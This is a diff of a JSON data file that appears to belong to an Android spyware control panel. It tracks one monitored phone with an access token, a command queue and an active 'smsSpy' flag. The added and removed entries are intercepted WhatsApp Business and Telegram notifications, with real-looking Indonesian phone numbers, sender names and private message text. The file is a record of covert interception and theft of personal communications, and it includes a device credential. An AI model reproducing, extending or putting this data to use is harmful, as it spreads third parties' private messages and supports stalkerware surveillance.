@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775633728878,
+    "lastSeen": 1775633734804,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 898-7564-441",
+        "content": "Swb sma bayar ciclan",
+        "time": "08/04 14:35",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633737141
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 838-1173-3694",
+        "content": "Bantu connect panel apk bug",
+        "time": "08/04 14:35",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633737062
+      },
+      {
+        "appName": "WA Business",
+        "sender": "𝙏𝙀𝘼𝙈 𝙉𝘼𝙓𝙍𝘼𝙏: Membalas Anda",
+        "content": "~ sfr: 💟 Stiker",
+        "time": "08/04 14:35",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633736930
+      },
+      {
+        "appName": "WA Business",
+        "sender": "+62 815-2386-4283",
+        "content": "taruu di gb ajaaa",
+        "time": "08/04 14:35",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1775633736782
+      },
       {
         "appName": "WA Business",
         "sender": "WA Business",
@@ -4294,38 +4326,6 @@
         "time": "08/04 14:21",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775632867220
-      },
-      {
-        "appName": "Telegram",
-        "sender": "STORE Reski",
-        "content": "Uy",
-        "time": "08/04 14:20",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632835876
-      },
-      {
-        "appName": "Telegram",
-        "sender": "STORE Reski",
-        "content": "Uy",
-        "time": "08/04 14:20",
-        "pkg": "org.telegram.messenger.web",
-        "receivedAt": 1775632835501
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 815-2386-4283",
-        "content": "‎2 pesan baru",
-        "time": "08/04 14:20",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775632815179
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 815-2386-4283",
-        "content": "dataa gw sekarat",
-        "time": "08/04 14:20",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775632815170
       }
     ],
     "galleryPhotos": [],
